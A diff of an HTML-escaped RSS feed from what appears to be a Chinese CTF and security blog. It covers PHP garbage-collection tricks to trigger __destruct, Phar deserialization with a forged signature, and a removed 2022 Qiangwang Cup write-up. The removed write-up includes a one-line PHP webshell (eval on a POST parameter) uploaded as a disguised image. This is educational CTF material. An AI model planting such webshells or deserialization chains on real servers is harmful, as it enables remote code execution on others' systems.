-	srcset=&#34;http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120150717356_hucf92e2ee1d8bf9e6495b2367ce13cb08_56674_480x0_resize_box_3.png 480w, http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120150717356_hucf92e2ee1d8bf9e6495b2367ce13cb08_56674_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120150717356_hucf92e2ee1d8bf9e6495b2367ce13cb08_56674_480x0_resize_box_3.png 480w, http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120150717356_hucf92e2ee1d8bf9e6495b2367ce13cb08_56674_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20221120150717356&#34;
@@ -550,10 +511,10 @@
 &lt;h3 id=&#34;demo-&#34;&gt;Demo :&lt;/h3&gt;
 &lt;p&gt;最后一行代码错误抛出异常，是无法触发&lt;code&gt;__destruct &lt;/code&gt;  需要正常结束程序&lt;/p&gt;
 &lt;p&gt;那我们就可以通过上面介绍的触发&lt;code&gt;GC机制&lt;/code&gt; 来绕过。这里将第二个索引置空。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120152723396.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120152723396.png&#34;
 	width=&#34;554&#34;
 	height=&#34;406&#34;
-	srcset=&#34;http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120152723396_hu0dee8c5d562011d8ed2c16bb1351a20a_30909_480x0_resize_box_3.png 480w, http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120152723396_hu0dee8c5d562011d8ed2c16bb1351a20a_30909_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120152723396_hu0dee8c5d562011d8ed2c16bb1351a20a_30909_480x0_resize_box_3.png 480w, http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120152723396_hu0dee8c5d562011d8ed2c16bb1351a20a_30909_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20221120152723396&#34;
@@ -573,10 +534,10 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;B&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;}&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120160431424.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120160431424.png&#34;
 	width=&#34;555&#34;
 	height=&#34;373&#34;
-	srcset=&#34;http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120160431424_hue86eeee58af33985c513547bfcb49471_29764_480x0_resize_box_3.png 480w, http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120160431424_hue86eeee58af33985c513547bfcb49471_29764_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120160431424_hue86eeee58af33985c513547bfcb49471_29764_480x0_resize_box_3.png 480w, http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120160431424_hue86eeee58af33985c513547bfcb49471_29764_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20221120160431424&#34;
@@ -586,10 +547,10 @@
 		data-flex-grow=&#34;148&#34;
 		data-flex-basis=&#34;357px&#34;
 	
-&gt; &lt;img src=&#34;http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120160507716.png&#34;
+&gt; &lt;img src=&#34;http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120160507716.png&#34;
 	width=&#34;581&#34;
 	height=&#34;371&#34;
-	srcset=&#34;http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120160507716_hu13f5293e9690aaac09b5611cc1b64a54_35743_480x0_resize_box_3.png 480w, http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120160507716_hu13f5293e9690aaac09b5611cc1b64a54_35743_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120160507716_hu13f5293e9690aaac09b5611cc1b64a54_35743_480x0_resize_box_3.png 480w, http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120160507716_hu13f5293e9690aaac09b5611cc1b64a54_35743_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20221120160507716&#34;
@@ -602,10 +563,10 @@
 &gt;&lt;/p&gt;
 &lt;h3 id=&#34;gc-phar反序列化利用&#34;&gt;GC Phar反序列化利用:&lt;/h3&gt;
 &lt;p&gt;Phar反序列化，使用&lt;code&gt;file_get_contents()&lt;/code&gt;函数，先按照正常流程去生成一个&lt;code&gt;.phar&lt;/code&gt;文件&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120161313572.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120161313572.png&#34;
 	width=&#34;483&#34;
 	height=&#34;387&#34;
-	srcset=&#34;http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120161313572_huf4e96f746b280f49a1bfd48cbf553c4a_31940_480x0_resize_box_3.png 480w, http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120161313572_huf4e96f746b280f49a1bfd48cbf553c4a_31940_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120161313572_huf4e96f746b280f49a1bfd48cbf553c4a_31940_480x0_resize_box_3.png 480w, http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120161313572_huf4e96f746b280f49a1bfd48cbf553c4a_31940_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20221120161313572&#34;
@@ -645,10 +606,10 @@
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;由于生成的phar文件不能随意修改，否则签名不匹配。先按照原来的方法修改数组值，然后在通过脚本进行伪造签名。&lt;/p&gt;
 &lt;p&gt;使用16进制编辑器打开 可以看到&lt;code&gt;i:1&lt;/code&gt;修改为&lt;code&gt;i:0&lt;/code&gt;  保存&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120162413824.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120162413824.png&#34;
 	width=&#34;629&#34;
 	height=&#34;270&#34;
-	srcset=&#34;http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120162413824_hu8afac5acadbb255c1b8dfe0e9a37f03d_56564_480x0_resize_box_3.png 480w, http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120162413824_hu8afac5acadbb255c1b8dfe0e9a37f03d_56564_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120162413824_hu8afac5acadbb255c1b8dfe0e9a37f03d_56564_480x0_resize_box_3.png 480w, http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120162413824_hu8afac5acadbb255c1b8dfe0e9a37f03d_56564_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20221120162413824&#34;
@@ -683,10 +644,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;接着使用&lt;code&gt;phar://&lt;/code&gt; 伪协议包含2.phar这个文件即可,成功执行了&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120162937285.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120162937285.png&#34;
 	width=&#34;1064&#34;
 	height=&#34;633&#34;
-	srcset=&#34;http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120162937285_hu6969d44455ec07431eff7511fb2167c9_63804_480x0_resize_box_3.png 480w, http://main1o.github.io/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120162937285_hu6969d44455ec07431eff7511fb2167c9_63804_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120162937285_hu6969d44455ec07431eff7511fb2167c9_63804_480x0_resize_box_3.png 480w, http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120162937285_hu6969d44455ec07431eff7511fb2167c9_63804_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20221120162937285&#34;
@@ -697,107 +658,11 @@
 		data-flex-basis=&#34;403px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;h2 id=&#34;参考链接&#34;&gt;🔗参考链接&lt;/h2&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://yangxikun.com/php/2013/08/24/php-garbage-collection-mechanism.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;PHP新的垃圾回收机制 (yangxikun.com)&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://blog.m1kael.cn/index.php/archives/14/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;PHP的GC机制 - M1kael‘s Blog&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/11843?accounttraceid=411ebc73f66f4f69aea04cef67b0ae0akryd&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;浅析PHP GC垃圾回收机制及常见利用方式 - 先知社区 (aliyun.com)&lt;/a&gt;&lt;/p&gt;
-</description>
-        </item>
-        <item>
-        <title>2022强网杯线上</title>
-        <link>http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A/</link>
-        <pubDate>Wed, 24 Aug 2022 00:00:00 +0000</pubDate>
-        
-        <guid>http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A/</guid>
-        <description>&lt;img src="http://main1o.github.io/1.png" alt="Featured image of post 2022强网杯线上" /&gt;&lt;h1 id=&#34;2022强网先锋--rcefile&#34;&gt;2022强网先锋  rcefile&lt;/h1&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pan.baidu.com/s/1u0m2yrAAmt8kBoZTGCfKpA?pwd=1234&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;环境下载地址&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;代码审计&lt;/p&gt;
+&lt;h2 id=&#34;例题&#34;&gt;例题：&lt;/h2&gt;
 &lt;blockquote&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/q1352483315/article/details/89527820&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;spl_autoload_register 说明&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;[ctf.show](&lt;a class=&#34;link&#34; href=&#34;https://ctf.show/challenges#easy&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://ctf.show/challenges#easy&lt;/a&gt; unserialize-1806)&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20220817234937507.png&#34;
-	width=&#34;1164&#34;
-	height=&#34;510&#34;
-	srcset=&#34;http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20220817234937507_hu8ab47c86e1280fbec6723458802ea055_57332_480x0_resize_box_3.png 480w, http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20220817234937507_hu8ab47c86e1280fbec6723458802ea055_57332_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220817234937507&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;228&#34;
-		data-flex-basis=&#34;547px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;spl_autoload_register()&lt;strong&gt;在没有限制的情况，new有一个当前不存在的类test，&lt;strong&gt;spl_autoload_register&lt;/strong&gt;会自动去当前目录下包含文件名为&lt;/strong&gt;test.php&lt;/strong&gt; 或者是&lt;strong&gt;test.inc&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;unserialize&lt;/strong&gt;反序列化本地cookie[&amp;lsquo;userfile&amp;rsquo;]&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;upload.php&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;在39行黑名单中并没有对 &lt;strong&gt;phar&lt;/strong&gt; 后缀进行过滤&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20220817234147354.png&#34;
-	width=&#34;1900&#34;
-	height=&#34;936&#34;
-	srcset=&#34;http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20220817234147354_hu355b9069130ff33d2038b415b106cf92_145545_480x0_resize_box_3.png 480w, http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20220817234147354_hu355b9069130ff33d2038b415b106cf92_145545_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220817234147354&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;202&#34;
-		data-flex-basis=&#34;487px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;上传文件 1.jpg  内容&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; 
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;phpinfo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;修改后缀 为 1.phar  并  查看图片获取重命名之后的图片名称&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20220817234834576.png&#34;
-	width=&#34;1263&#34;
-	height=&#34;848&#34;
-	srcset=&#34;http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20220817234834576_hu2b629fbd0296c0ff6c8d69392f6631da_140561_480x0_resize_box_3.png 480w, http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20220817234834576_hu2b629fbd0296c0ff6c8d69392f6631da_140561_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220817234834576&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;148&#34;
-		data-flex-basis=&#34;357px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20220818000313742.png&#34;
-	width=&#34;722&#34;
-	height=&#34;142&#34;
-	srcset=&#34;http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20220818000313742_huaab396d7c856ac7fe393a1d508fb1ce8_15266_480x0_resize_box_3.png 480w, http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20220818000313742_huaab396d7c856ac7fe393a1d508fb1ce8_15266_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220818000313742&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;508&#34;
-		data-flex-basis=&#34;1220px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;使用这个名称去构建一个序列化对象 ，&lt;strong&gt;config.inc.php&lt;/strong&gt;去cookie里找，并进行反序列化。触发**spl_autoload_register()**去包含&lt;/p&gt;
-&lt;p&gt;afd4b9668ced586e2528dc1863a650fd.inc&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
@@ -811,49 +676,165 @@
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; 
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
